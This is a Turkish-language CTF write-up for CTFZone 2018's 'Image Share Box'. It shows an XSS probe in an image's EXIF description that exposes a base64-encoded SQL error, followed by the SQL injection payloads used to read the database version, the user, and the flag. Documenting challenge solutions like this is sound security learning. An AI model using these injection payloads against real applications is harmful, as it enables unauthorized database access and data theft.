# Image Share Box - CTFZone 2018

```
We created a new cool service that allows you to share your images with everyone (it's on beta now)! The only thing you need to share something is an Image Description!
Happy sharing!

https://img.ctf.bz
```

Link'e gittik ve karşımıza böyle bir sayfa geldi

![](1.png)

Dropbox ile giriş yaptık, resim görüntüleme ve resim upload olmak üzere 2 adet sayfa vardı.

![](2.png)

![](3.png)

Resim yüklemeye çalıştığımız zaman description'u olmadığını dile getiriyordu

![](4.png)

__EXIF__'te ki __Image description__ kısmından bashediyor olabilir mi dedik ve __XSS__ payload'u koyalım dedik.

```
lorem" onload="eval('debugger;')
```
Fakat bir hata ile karsilastik
![](5.png)
```
Unknown error. Please send this information to admin: 
imgsbKF9teXNxbF9leGNlcHRpb25zLlByb2dyYW1taW5nRXJyb3IpICgxMDY0LCAiWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnZGVidWdnZXI7JyknLCAnaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy95bGVlejY1MjczeWR4MjAveHNzLmpwZWc/ZGw9MCZyYXc9MScsICcnIGF0IGxpbmUgMSIpIFtTUUw6ICdJTlNFUlQgSU5UTyBgaW1hZ2Vfc2hhcmVzYCAoYG93bmVyYCwgYGRlc2NyaXB0aW9uYCwgYGltYWdlX2xpbmtgLCBgYXBwcm92ZWRgKSBWQUxVRVMgKFwnZGJpZDpBQURPR1FjQkY3Um9lRWtRU3R4YmhnMFlsMW1BaTJPRjA4c1wnLCBcJ2xvcmVtIiBvbmxvYWQ9ImV2YWwoXCdkZWJ1Z2dlcjtcJylcJywgXCdodHRwczovL3d3dy5kcm9wYm94LmNvbS9zL3lsZWV6NjUyNzN5ZHgyMC94c3MuanBlZz9kbD0wJnJhdz0xXCcsIFwnMFwnKSddIChCYWNrZ3JvdW5kIG9uIHRoaXMgZXJyb3IgYXQ6IGh0dHA6Ly9zcWxhbGNoZS5tZS9lL2Y0MDUpc
```

__imgsb__'den sonraki kısımın __base64__'olduğu belliydi ve decode ettik.

```
(_mysql_exceptions.ProgrammingError) (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'debugger;')', 'https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&raw=1', '' at line 1") [SQL: 'INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES (\'dbid:AADOGQcBF7RoeEkQStxbhg0Yl1mAi2OF08s\', \'lorem" onload="eval(\'debugger;\')\', \'https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&raw=1\', \'0\')'] (Background on this error at: http://sqlalche.me/e/f405)t
```

Hatalı sorgu böyle imiş
```sql
INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES ('dbid:AADOGQcBF7RoeEkQStxbhg0Yl1mAi2OF08s', 'lorem" onload="eval('debugger;')', 'https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&raw=1', '0')
```

Sorgunun normal halini çıkarttık

```sql
INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES ('dbid:$owner', '$description', '$image_link', '0')
```

Artık __SQL injection__ yapabiliriz.

Versiyon bilgisini alalım ilk olarak
```sql
test',(select version()),'0');#
```
![](6.png)

Sonra kullanıcı bilgisini

```sql
aciklama',(select user()),'0');#
```
![](7.png)

Daha sonra ise flag'i
```sql
',(SELECT GROUP_CONCAT(owner,0x3a,description) FROM image_shares AS a WHERE id="1"),'0');#
```
![](8.png)

```
dbid:736b6e6f5070336f26696e6c2b6f657651657a75:ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}
```

ve flag

```
ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}
```
